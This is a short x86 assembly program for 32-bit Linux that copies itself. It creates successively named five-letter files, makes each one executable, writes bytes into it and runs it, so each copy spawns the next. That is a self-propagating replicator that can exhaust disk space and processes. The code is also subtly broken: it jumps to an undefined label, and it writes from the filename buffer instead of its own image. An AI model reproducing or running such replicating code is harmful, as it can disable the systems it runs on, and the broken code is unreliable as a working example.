BITS 32

SIZE equ 0xc7

segment .data

	file_name db 'aaaaa', 0

	tmp db 0,0

segment .text

global _start

_start:                  ; initialisation of some registers
	xor ebx, ebx
	xor ecx, ecx
	mov esi, file_name

; the name is a 5 characters string between a-z

name:                   ;  handle the name of the son from the actual name
	mov al, [esi]
	cmp al, 0x79        ; 0x79 = 'z'
	jg name_aux
	inc al
	mov [esi], al
	jmp opening

last_character:         ; handle if the last character is z
	mov al, 0x61        ; 0x61 = 'a'
	mov [esi], al
	inc esi
	jmp name

; create the next file

opening:
	mov eax, 0x05		    ; syscall 32 bits for open
	mov ebx, file_name
	mov cl, 100
	xor cl, 1
	int 0x80
	mov ebx, eax

; make the next file executable

executable:
	push ebx
	mov eax, 0x0f  	    ; syscall 32 bits for chmod
	mov ecx, 1
	xor ecx, 8
	xor ecx, 64
	mov ebx, file_name
	int 0x80
	pop ebx

; copy the actual file in the next

copy:
	mov eax, 0x04       ; syscall 32 bits for write
	mov ecx, file_name  ; start of file
    mov edx, SIZE       ; file's size
	int 0x80

close:
	mov eax, 6		; syscall 32 bits for close
	int 0x80

; execute the next file (for statistic)

exec:
	mov eax, 0x0b	    ; syscall 32 bits for execve ;
	mov ebx, file_name
	xor ecx, ecx
	xor edx, edx
	int 0x80
